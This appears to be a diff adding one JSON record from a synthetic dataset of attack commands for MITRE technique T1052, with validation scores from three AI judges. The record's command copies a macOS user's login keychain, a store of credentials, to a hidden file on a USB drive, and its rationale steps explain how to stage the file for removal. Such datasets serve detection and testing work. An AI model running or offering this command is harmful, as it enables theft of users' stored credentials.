@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "dd if=\"$HOME/Library/Keychains/login.keychain-db\" of=\"/Volumes/NO\\ NAME/.Trashes/.kch\" bs=2m conv=sync,noerror && sync",
+  "explanation": "Copies the login keychain database as raw bytes to a hidden path inside the external drive's .Trashes directory using dd.",
+  "rationale_steps": [
+    "Select a sensitive local file to stage for removal.",
+    "Use dd to copy the file as raw data to a plausible hidden location on the USB.",
+    "Keep the operation local to the system with no network usage.",
+    "Sync to ensure data integrity on the removable media."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-a1e902a4",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, valid dd options, and correct chaining; the backslash within double quotes is literal but does not break parsing.",
+        "semantic_score": 4,
+        "semantic_justification": "It aligns with T1052 by copying the login keychain to a hidden file on an external drive via dd, though the backslash-escaped space inside quotes likely misaddresses the volume path and could cause failure.",
+        "combined_score": 4.5,
+        "confidence": 0.77,
+        "timestamp": "2025-10-01T07:51:19.859998Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with proper use of &&, valid dd flags, and correct conv options, though the backslash-escaped space in the path '/Volumes/NO\\ NAME/' may cause issues in some shell contexts since it's already inside double quotes where the backslash is unnecessary.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by copying the macOS login keychain database (a high-value credential store) as raw bytes via dd to a hidden path within the .Trashes directory of an external volume, using sync to ensure data integrity before physical removal, which is operationally realistic and well-aligned with the technique.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2026-02-18T22:34:57.578992Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct shell syntax, properly escaped spaces, valid variable expansion, and standard flag formats.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively copies sensitive user credentials to a hidden path on a removable volume, aligning with the exfiltration and obfuscation aspects of T1052.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:34:58.632949Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
